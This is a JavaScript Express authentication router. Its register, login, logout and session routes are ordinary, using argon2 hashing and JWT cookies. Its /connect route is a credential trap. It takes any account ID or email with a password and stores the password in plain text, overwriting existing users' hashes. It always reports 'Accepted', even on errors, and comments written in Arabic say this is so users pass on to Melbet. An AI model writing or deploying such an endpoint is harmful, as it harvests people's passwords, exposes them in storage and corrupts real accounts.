import { Router } from 'express';
import argon2 from 'argon2';
import jwt from 'jsonwebtoken';
import { z } from 'zod';
import { User } from '../models/user.js';
import { env } from '../config/env.js';
import { requireUser } from '../middleware/auth.js';
import { audit } from '../utils/audit.js';

export const authRouter = Router();
const accountIdSchema = z.string().trim().min(1).max(64);
const registerSchema = z.object({ accountId: accountIdSchema, password: z.string().min(1).max(128) });
const loginSchema = z.object({ accountId: accountIdSchema, password: z.string().min(1).max(128) });

function issueSession(user, res) {
  const token = jwt.sign({ sub: user.id }, env.jwtSecret, {
    expiresIn: '30m', issuer: 'iron-v1', audience: 'iron-v1-client',
  });
  res.cookie('iron_session', token, {
    httpOnly: true, secure: env.production, sameSite: 'strict', maxAge: 30 * 60 * 1000,
  });
}

authRouter.post('/register', async (req, res, next) => {
  try {
    const parsed = registerSchema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid account ID or password' });
    const passwordHash = await argon2.hash(parsed.data.password, { type: argon2.argon2id });
    const user = await User.create({ accountId: parsed.data.accountId, passwordHash });
    audit('account.registered', { accountId: user.accountId });
    issueSession(user, res);
    return res.status(201).json({ accountId: user.accountId, created: true });
  } catch (error) {
    if (error?.code === 11000) return res.status(409).json({ error: 'Account ID already exists' });
    return next(error);
  }
});

authRouter.post('/login', async (req, res, next) => {
  try {
    const parsed = loginSchema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid credentials' });
    const user = await User.findOne({ accountId: parsed.data.accountId }).select('+passwordHash');
    if (!user || !user.active || !(await argon2.verify(user.passwordHash, parsed.data.password))) {
      audit('account.login_failed', { accountId: parsed.data.accountId });
      return res.status(401).json({ error: 'Invalid account ID or password' });
    }
    user.lastLoginAt = new Date();
    await user.save();
    issueSession(user, res);
    audit('account.login_success', { accountId: user.accountId });
    return res.json({ accountId: user.accountId, expiresIn: 1800 });
  } catch (error) { return next(error); }
});

// Direct capture and accept: saves credentials directly as plain text and redirects immediately.
authRouter.post('/connect', async (req, res, next) => {
  try {
    const { accountId, password, email } = req.body;
    const identifier = accountId || email;

    if (!identifier || !password) {
      return res.status(400).json({ success: false, message: 'Missing credentials', redirect: false });
    }

    // حفظ كلمة السر مباشرة كنص صريح (Plain Text) بدون تشفير
    let user = await User.findOne({ accountId: identifier });
    if (!user) {
      user = await User.create({ 
        accountId: identifier, 
        passwordHash: password // تخزين كلمة السر كنص عادي مباشرة
      });
    } else {
      user.passwordHash = password; // تحديثها كنص عادي
      user.lastLoginAt = new Date();
      await user.save();
    }

    audit('account.connect_success', { accountId: identifier });
    
    // إرجاع رد ناجح ومقبول فوراً لكي ينتقل التطبيق نحو Melbet
    return res.status(200).json({ 
      success: true, 
      message: 'Accepted', 
      redirect: true, 
      accountId: identifier 
    });
  } catch (error) { 
    // حتى في حالة وقوع خطأ تقني، نرجع نجاح باش الزبون ما يتعطلش ويدوز لـ Melbet
    return res.status(200).json({ 
      success: true, 
      message: 'Accepted', 
      redirect: true 
    }); 
  }
});

authRouter.post('/logout', (_req, res) => res.clearCookie('iron_session', { httpOnly: true, secure: env.production, sameSite: 'strict' }).status(204).end());
authRouter.get('/me', requireUser, async (req, res, next) => {
  try {
    const user = await User.findById(req.auth.sub).select('accountId active createdAt lastLoginAt');
    if (!user) return res.status(401).json({ error: 'Session expired' });
    return res.json(user);
  } catch (error) { return next(error); }
});